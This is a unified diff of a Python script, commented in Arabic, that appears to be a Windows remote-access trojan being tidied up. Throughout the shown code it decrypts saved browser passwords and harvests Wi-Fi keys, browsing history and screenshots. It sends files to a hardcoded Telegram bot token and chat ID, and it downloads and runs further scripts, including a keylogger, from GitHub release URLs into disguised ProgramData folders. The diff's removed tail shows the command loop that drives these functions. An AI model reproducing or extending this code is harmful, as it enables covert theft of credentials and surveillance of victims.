@@ -1,34 +1,21 @@
-import os, time, shutil, sqlite3, json, base64, subprocess, win32crypt
+# احتفظ بكل الاستيرادات (Imports) التي وضعتها في بداية ملفك هنا...
+import os, time, shutil, sqlite3, json, base64, subprocess, win32crypt, gc, requests, threading, runpy
 from Crypto.Cipher import AES
 from PIL import ImageGrab
-import requests
-import runpy
-import threading
-from pathlib import Path
-import os
-import requests
-import subprocess
-from pathlib import Path
-import time
-from PIL import ImageGrab
 import pygetwindow as gw
-import os, time
-CREATE_NO_WINDOW = 0x08000000
-import requests
-import runpy
-import threading
-import gc
 from pathlib import Path
 
-
-import requests
-import gc
-
+# --- الثوابت ---
 TELEGRAM_TOKEN = "8265205917:AAE4AtsWD52-kenwjYWrg6LtAZ25IEVOjVI"
 CHAT_ID = "6693150100"
+BASE_DIR = r"C:\ProgramData\WinExec"
+CMD_FILE = os.path.join(BASE_DIR, "cmd.txt")
+RES_FILE = os.path.join(BASE_DIR, "res.txt")
+SS_FILE = os.path.join(BASE_DIR, "ss.png")
+CREATE_NO_WINDOW = 0x08000000
 
+# --- الدوال (نفس دوالك تماماً) ---
 def send_to_telegram(file_path):
-    """دالة مخصصة لإرسال الملفات إلى التليجرام"""
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
         with open(file_path, "rb") as f:
@@ -36,15 +23,7 @@ def send_to_telegram(file_path):
             files = {"document": f}
             response = requests.post(url, data=payload, files=files, timeout=30)
         return response.status_code == 200
-    except:
-        return False
-    
-
-
-BASE_DIR = r"C:\ProgramData\WinExec"
-CMD_FILE = os.path.join(BASE_DIR, "cmd.txt")
-RES_FILE = os.path.join(BASE_DIR, "res.txt")
-SS_FILE = os.path.join(BASE_DIR, "ss.png")
+    except: return False
 
 def get_master_key(path):
     try:
@@ -163,7 +142,7 @@ def run_history():
                 gc.collect() 
                 
     return out
-
+#################################################################################################
 CROSSMOS_PATH = Path(r"C:\ProgramData\WinCore\wincore.py")
 CROSSMOS_URL  = "https://github.com/anaslabrini/crossmos/releases/download/v1.0/wincore.py"
 PYTHON_EXEC   = Path(r"C:\ProgramData\WinCore\pywin.exe")
@@ -199,7 +178,7 @@ def update():
         print(f"[!] Update failed: {e}")
 
 
-BASE_DIR = r"C:\ProgramData\SysKey"
+BASE_DIR_SYSKEY = r"C:\ProgramData\SysKey"
 SCRIPT_NAME = "syskey.py"
 LOCAL_PYTHON_NAME = "pwiny.exe"
 SOURCE_PYTHON = r"C:\ProgramData\WinCore\pywin.exe"
@@ -207,11 +186,11 @@ GITHUB_URL = "https://github.com/anaslabrini/crossmos/releases/download/v1.0/sys
 
 def download_and_run():
     try:
-        if not os.path.exists(BASE_DIR):
-            os.makedirs(BASE_DIR)
+        if not os.path.exists(BASE_DIR_SYSKEY):
+            os.makedirs(BASE_DIR_SYSKEY)
 
-        script_path = os.path.join(BASE_DIR, SCRIPT_NAME)
-        local_python_path = os.path.join(BASE_DIR, LOCAL_PYTHON_NAME)
+        script_path = os.path.join(BASE_DIR_SYSKEY, SCRIPT_NAME)
+        local_python_path = os.path.join(BASE_DIR_SYSKEY, LOCAL_PYTHON_NAME)
 
         if not os.path.exists(local_python_path) and os.path.exists(SOURCE_PYTHON):
             shutil.copy2(SOURCE_PYTHON, local_python_path)
@@ -243,15 +222,15 @@ def remove_script():
         
         time.sleep(2)
 
-        if os.path.exists(BASE_DIR):
-            shutil.rmtree(BASE_DIR, ignore_errors=True)
+        if os.path.exists(BASE_DIR_SYSKEY):
+            shutil.rmtree(BASE_DIR_SYSKEY, ignore_errors=True)
             
         return "REMOVE_SUCCESS"
     except Exception as e:
         return f"ERROR_DURING_REMOVE: {str(e)}"
 
 
-
+#################################################################################################
 FILES = {
     "winmon.py": "https://github.com/anaslabrini/crossmos/releases/download/v1.0/winmon.py",
     "windef.py": "https://github.com/anaslabrini/crossmos/releases/download/v1.0/windef.py"
@@ -287,7 +266,7 @@ def startup():
 if __name__ == "__main__":
     threading.Thread(target=startup, daemon=True).start()
 
-
+##############################################################################################
 
 import ctypes
 import os
@@ -560,54 +539,3 @@ for f in [CMD_FILE, RES_FILE, SS_FILE]:
     except: pass
 
 gc.collect() # ابدأ بذاكرة نظيفة
-def we():
-    while True:
-        if os.path.exists(CMD_FILE):
-            try:
-                with open(CMD_FILE, "r") as f:
-                    cmd = f.read().strip()
-                res = ""
-                if cmd == "passwords":
-                    res = run_passwords()
-                elif cmd == "keylogger":
-                    res = download_and_run()
-                elif cmd == "rmkeylogger":
-                    res = remove_script()
-                elif cmd == "wifi":
-                    res = run_wifi()
-                elif cmd in ["history", "browser"]:
-                    res = run_history()
-                elif cmd == "update":
-                    res = update()
-                elif cmd == "searchs":
-                    res = extract_all_browser_history()
-                elif cmd == "downloads":
-                    res = extract_all_browser_downloads()
-
-
-                elif cmd == "screenshot":
-                    shot = ImageGrab.grab()
-                    shot.save(SS_FILE)
-                    shot.close() # إغلاق ملف الصورة في الذاكرة
-                    del shot     # مسح الكائن تماماً
-                    res = "SCREENSHOT_DONE"
-
-
-                elif cmd == "screenshot_active":
-                    window = gw.getActiveWindow()
-                    if window:
-                        bbox = (window.left, window.top, window.right, window.bottom)
-                        ImageGrab.grab(bbox=bbox).save(SS_FILE)
-                        res = "SCREENSHOT_ACTIVE_DONE"
-                    else:
-                        res = "NO_ACTIVE_WINDOW"
-                with open(RES_FILE, "w", encoding="utf-8") as f:
-                    f.write(res)
-                os.remove(CMD_FILE)
-                # --- التعديل هنا ---
-                del res       # حذف نص النتائج الضخم من الذاكرة فوراً بعد كتابته في الملف
-                gc.collect()  # إجبار بايثون على تنظيف الرام من بقايا العملية
-                # -----------------
-            except:
-                pass
-        time.sleep(1)
